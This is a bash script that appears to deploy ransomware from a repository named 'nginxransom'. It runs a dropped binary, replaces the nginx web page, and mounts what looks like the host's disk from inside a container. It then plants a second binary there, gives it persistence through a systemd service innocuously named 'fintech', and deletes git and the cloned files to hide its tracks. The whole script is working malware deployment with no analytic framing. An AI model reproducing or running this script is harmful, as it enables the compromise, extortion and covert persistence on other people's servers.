#!/bin/bash  
#apt update -y 
#apt install git -y  
#git clone https://github.com/xeroxpro/nginxransom.git
cp   nginxransom/initialize.txt /usr/bin/initialize  
chmod 777 /usr/bin/initialize 
initialize &
cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
mount $diskpart /mnt/
cp   nginxransom/bootstarp.txt /mnt/usr/bin/bootstarp
cp   nginxransom/bootstarp.txt /mnt/usr/local/bin/bootstarp 
cp   nginxransom/bootstarp.txt /usr/bin/bootstarp 
chmod 777 /usr/bin/bootstarp 
chmod 777 mnt/usr/local/bin/bootstarp
chmod 777 mnt/usr/bin/bootstarp 
#chroot ./ ./bootstarp 
echo  "[Unit]\nDescription=fintech\nAfter=network.target\n[Service]\nType=oneshot\nRemainAfterExit=yes\n\nExecStart=/usr/local/bin/bootstarp\nExecStop=/usr/local/bin/bootstarp\n\n[Install]\nWantedBy=multi-user.target" > mnt/usr/lib/systemd/system/fintech.service
chmod 777  mnt/usr/lib/systemd/system/fintech.service
chroot mnt/ systemctl systemctl enable fintech.service
chroot mnt/ systemctl start fintech.service
apt remove git -y
rm -rf nginxransom/
